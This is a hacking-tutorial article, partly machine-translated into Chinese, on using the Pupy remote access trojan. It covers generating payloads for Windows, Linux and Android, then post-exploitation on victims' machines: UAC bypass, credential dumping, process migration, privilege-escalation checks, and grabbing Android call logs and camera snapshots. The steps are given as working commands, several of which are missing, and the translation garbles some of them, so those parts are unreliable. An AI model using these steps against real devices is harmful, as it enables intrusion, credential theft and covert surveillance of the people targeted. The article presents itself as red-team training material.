> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.hackingarticles.in](https://www.hackingarticles.in/command-control-tool-pupy/)

> In this article, we will learn to exploit Windows, Linux and Android with pupy command and control to......

In this article, we will learn to exploit Windows, Linux and Android with pupy command and control tool.

### Table of Content :

*   Introduction
*   Installation
*   Windows Exploitation
*   Windows Post Exploitation
*   Linux Exploitation
*   Linux Post Exploitation
*   Android Exploitation
*   Android Post Exploitation

### **Introduction**

Pupy is a cross-platform, post-exploitation tool as well as a multi-function RAT. It’s written in python which makes it very convenient. It also has low detectability that’s why it’s a great tool for the red team.  Pupy can communicate using multiple kinds of transport, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory.

It uses a reflected DLL to load python interpreter from memory which is great as nothing will be shown in the disk. It doesn’t have any special dependencies. It can also migrate into other processes. The communication protocols of pupy are modular and stackable. It can execute non-interactive commands on multiple hosts at once. All the interactive shells can be accessed remotely.

### **Installation**

To install pupy execute the following commands one by one :

```
git clone https://github.com/n1nj4sec/pupy

ls

./install.sh
```

![](https://i1.wp.com/1.bp.blogspot.com/-YnExP_TyVQY/XJCzyYcfEhI/AAAAAAAAAeU/XUYvAdTuLu0jwFMCSSQjdbNz6qUF_H1eQCEwYBhgL/s1600/1.png?w=640)

Now download all the requirements using pip like the following command :

```
cd pupy

pip install -r requirements.txt
```

![](https://i0.wp.com/3.bp.blogspot.com/-Uq_0ephMlWs/XJCz1F7KQmI/AAAAAAAAAek/GZqUeqiYB-8rGVcScykwUExpwfY-PV58QCEwYBhgL/s1600/2.png?w=640)

Now run pupy using the following command :

This command will open the prompt where you will get your session.

![](https://i2.wp.com/4.bp.blogspot.com/-GeshlpHB7HQ/XJCz3iP5_NI/AAAAAAAAAeY/_TtaCMsnB04BkSEMvAjhMwFmVP9wQLWWgCEwYBhgL/s1600/3.png?w=640)

Now, to create our payload we will use the pupygen. Use the following help command to see all the attributes which we can use :

![](https://i1.wp.com/3.bp.blogspot.com/--xoF1fxAwU8/XJCz3tNA-FI/AAAAAAAAAec/LAfSOXQw3EUbh7GcAYLyqc-d0ka6KI6WwCEwYBhgL/s1600/4.png?w=640)

### **Windows Exploitation**

Now we will create a windows payload in order to exploit windows with the following command :

```
./pupygen.py -O windows -A x86 -o /root/Desktop/shell.exe
```

Here,

**-O:** refers to the operating system

**-A:** refers to the architecture

**-o:** refers to the output file path

![](https://i0.wp.com/3.bp.blogspot.com/-ozK0TALS5o8/XJCz39AbtmI/AAAAAAAAAek/5rmJyZRhhcA1DaDodjcmuaOEc73v5gp_wCEwYBhgL/s1600/5.png?w=640)

When you are successful in executing the shell.exe in the victims’ PC, you will have your session as shown in the image :

![](https://i0.wp.com/4.bp.blogspot.com/-wp3m0MblVt0/XJCz4H-EsUI/AAAAAAAAAec/V-GoC_5k-kYljVUyNoP5xb89DzGovSqegCEwYBhgL/s1600/6.png?w=640)

### **Windows Post Exploitation**

Further, there are a number of post-exploits you can use, they are pretty simple to use. Some of them we have shown in our article. For message dialogue box to pop up on the target machine you can use the following command :

```
msgbox –-title hack "you have been hacked"
```

![](https://i0.wp.com/2.bp.blogspot.com/-9DPvDsKK_I0/XJCz4TcWDgI/AAAAAAAAAek/Hs7QxX9lvnEwJnUiL7jnomE_A_jfMHMCACEwYBhgL/s1600/7.png?w=640)

As per the command, following dialogue box will open on the target machine :

![](https://i0.wp.com/2.bp.blogspot.com/-bvARH1g2DYg/XJCz4iyiYlI/AAAAAAAAAeg/l8EYUijiH9g_zhIaLKAvGdAulj85irTlACEwYBhgL/s1600/8.png?w=640)

You can also access the desktop using the remote desktop module with the following command :

![](https://i2.wp.com/2.bp.blogspot.com/-uwf8ib3ftOc/XJCz5PqXZmI/AAAAAAAAAek/ZNXzgT5AMYA0Bt7DnNvDTeF3AIpHP_zhQCEwYBhgL/s1600/9.png?w=640)

After executing the above command you can remotely access the desktop just as shown in the image below :

![](https://i1.wp.com/2.bp.blogspot.com/-Bc9zOQVAB3g/XJCzykRfy4I/AAAAAAAAAec/HJyssvmCFWog943wsD0IQMPKrk0cF-uyQCEwYBhgL/s1600/10.png?w=640)

For bypass UAC, we have the simplest command in pupy i.e. the following :

The above command will recreate a session with admin privileges as shown in the image below :

![](https://i2.wp.com/1.bp.blogspot.com/-EZYDyG7ytWU/XJCzyiah2DI/AAAAAAAAAeM/BB-me9Yrdhgp4ErgHAir5TY64KXKBaGTQCEwYBhgL/s1600/11.png?w=640)

For getting the system’s credentials, you can use the following command :

And as you can see in the image below, you get the information about all the credentials :

![](https://i1.wp.com/3.bp.blogspot.com/-pixYioj4NBQ/XJCzzBoW9wI/AAAAAAAAAeM/yidaAk65ipkNOzpszlX6baMv6TqKnIYggCEwYBhgL/s1600/12.png?w=640)

Using pupy, we can also migrate our session to a particular process. With migrate command, the attributes of the command are shown in the image below :

![](https://i2.wp.com/4.bp.blogspot.com/-Ots3nCLlHCE/XJCzzXrZ8YI/AAAAAAAAAeM/wXD59FbvHsMaI98Pgii1OOth2L7KdswIwCEwYBhgL/s1600/13.png?w=640)

With ps command, you can find out the process ID number of all the processes running on the target PC, along with letting you know which process is running. Knowing the process ID is important as it will be required in the migrate command and will help us to migrate our session as we desire.

![](https://i0.wp.com/2.bp.blogspot.com/-5TDrFfjWByo/XJCzztkPZMI/AAAAAAAAAeY/igSp1VhoFdA3lC87872ms7yv0TR76M30QCEwYBhgL/s1600/14.png?w=640)

Now, as we know the processes that are running, we can use it to migrate our session. For this, type the following command :

```
migrate -p explorer.exe -k
```

![](https://i1.wp.com/4.bp.blogspot.com/-tvOa_bdhj3g/XJCz0Lui9LI/AAAAAAAAAec/zX0lUfyIBSQaPSlF3UECtgwkqsrvINbCQCEwYBhgL/s1600/15.png?w=640)

And then a new session will be created as desired.

### **Linux Exploitation**

To exploit Linux, we will have to generate Linux payload with the following command :

```
./pupygen.py -O linux -A x64 -o /root/Desktop.shell
```

![](https://i2.wp.com/4.bp.blogspot.com/-biB8zdE_myE/XJCz0GFaRPI/AAAAAAAAAek/5K3je2GjGk8KYicdsw-sWCcpvBezGFA4QCEwYBhgL/s1600/16.png?w=640)

Once you execute the malicious file in the target system, you will have your session as shown in the image below :

![](https://i1.wp.com/4.bp.blogspot.com/-g_PT7wkNsA4/XJCz0ZvfACI/AAAAAAAAAeU/_H0twPPTSvwT6W6lJ1VC6YRZ_k9wKt6hgCEwYBhgL/s1600/17.png?w=640)

现在，您拥有一个会话，可以使用以下命令检查目标计算机是在VM上运行还是在主机上：

正如您在下图中所看到的，目标计算机实际上是在VM上运行的

![](https://i1.wp.com/1.bp.blogspot.com/-tf7_KSjj9w0/XJCz0k8uoTI/AAAAAAAAAeU/2-ebDOTj7m8oBC2KMTAhdN45Lh1la31TgCEwYBhgL/s1600/18.png?w=640)

### **Linux后期开发**

在利用后，您可以使用以下命令获取有关目标系统的详细信息：

```
privesc_checker --linenum
```

![](https://i0.wp.com/2.bp.blogspot.com/-RqdH6Nv9XHE/XJCz04DWloI/AAAAAAAAAec/4272xmkt9QAZvp34bl-cHrsMGhiqu04PACEwYBhgL/s1600/19.png?w=640)

使用pupy，您还可以借助以下命令找出在目标系统上运行的所有漏洞：

```
exploit_suggester –shell / bin / bash
```

正如您在下图中所看到的，它为我们提供了目标系统容易受到攻击的所有利用的列表。

![](https://i2.wp.com/2.bp.blogspot.com/-pLeWe_ZVeNU/XJCz1cHxKSI/AAAAAAAAAeQ/4GcflFzmjq8HdWdTarq0xMNrolO6ypTegCEwYBhgL/s1600/20.png?w=640)

要获取有关目标系统的基本信息，例如IP地址，MAC地址等，可以使用以下命令：

![](https://i2.wp.com/2.bp.blogspot.com/-Te1lKV_Enlw/XJCz1jh6fJI/AAAAAAAAAeY/3YIVwVdTziUJCcSJD8kUo1aBA716f2dKwCEwYBhgL/s1600/21.png?w=640)

### **Android开发**

现在，我们将使用以下命令创建一个Android有效负载以利用Windows：

```
./pupygen.py -O android -o /root/shell.apk
```

![](https://i1.wp.com/4.bp.blogspot.com/-5tjem2Lme5E/XJCz1xHJrjI/AAAAAAAAAeQ/qC2gg_C8ZpIb1A8xmSYiPOCHqKLzmHDpwCEwYBhgL/s1600/22.png?w=640)

成功在受害人的Android Phone中安装shell.apk时，您将进行如下图所示的会话：

![](https://i0.wp.com/3.bp.blogspot.com/-WnXqLV7OPek/XJCz2Ham70I/AAAAAAAAAec/0JDaU71FWf4rUvAWIlxkSnJKyVxEu8mqwCEwYBhgL/s1600/23.png?w=640)

### **Android Post开发**

在利用后，您可以使用以下命令获取存储在目标设备上的呼叫日志：

```
调用-a-输出-文件夹/ root /调用
```

这里，

**-a：**指获取所有通话详细信息

**-output-folder：**指包含调用日志的输出文件的路径

![](https://i2.wp.com/3.bp.blogspot.com/-4CYhTx9m4iE/XJCz2mMdOGI/AAAAAAAAAeg/3Jk_OVqR_9MHrav3bcUzV3GZT0uQQaTsACEwYBhgL/s1600/24.png?w=640)

我们将在callDetails.txt上使用cat命令来读取呼叫日志。

![](https://i2.wp.com/3.bp.blogspot.com/-phU43fGK8Ao/XJCz28ZO7rI/AAAAAAAAAek/9TaadD8t3uozOWvldPBwRdaJBJqJYdA9QCEwYBhgL/s1600/25.png?w=640)

要从目标设备上的主摄像机获取摄像机快照，可以使用以下命令：

这里，

**-v :** refers to view the image directly

As we can see in the given image that we have the snap captured and stored at the given location.

![](https://i2.wp.com/2.bp.blogspot.com/-VUKlvXL-nVE/XJCz2-HgmQI/AAAAAAAAAeU/Nex4d8EcE2M-YZoPCvFlArxFZGJXOe-vwCEwYBhgL/s1600/26.png?w=640)

To get the information about the installed packages or apps on the target device, you can use the following command :

Here,

**-a:** refers to getting all the installed packages details

**-d:** refers to view detailed information

As we can see in the given image that we have detailed information about the packages or apps installed on the target machine.

![](https://i2.wp.com/2.bp.blogspot.com/-2rM1pdwQ5wo/XJCz3EvW5sI/AAAAAAAAAeU/7IKxz_oh2AU408Et2uU3aeZErp75iKd-ACEwYBhgL/s1600/27.png?w=640)

**Author:** Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast**.** Contact **[Here](https://www.linkedin.com/in/sayantan-bera-2098a613b/)**